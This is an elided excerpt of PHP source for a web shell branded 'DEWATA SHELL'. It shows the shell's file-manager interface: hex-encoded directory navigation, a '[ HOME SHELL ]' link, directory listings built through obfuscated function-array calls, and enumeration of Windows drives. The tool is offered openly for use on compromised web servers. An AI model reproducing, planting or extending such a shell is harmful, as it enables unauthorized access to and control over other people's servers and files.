...
function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        ...
        return '<i class="fa-solid fa-file-code" style="color:#09e36c"></i>';
        ...
        return '<i class="fa-solid fa-file" style="color:#97f9f1"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#09e36c"></i>';
    }
}
...
<head>
    ...
    <title>DEWATA [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/Swacy-pixi</li>
            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/AyanaEx/External/main/DEWATASHELL.png" align="right"></li>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="//github.com/Swacy-pixi/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
        ...
        <div class="path-pwd">
            ...
            echo "<a style='font-weight:bold; color:#ff87ce;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
            </div>
        </div>
        </ul>
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:#ff87ce;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
...
function windowsDriver()
{
    ...
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:#ff87ce; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}
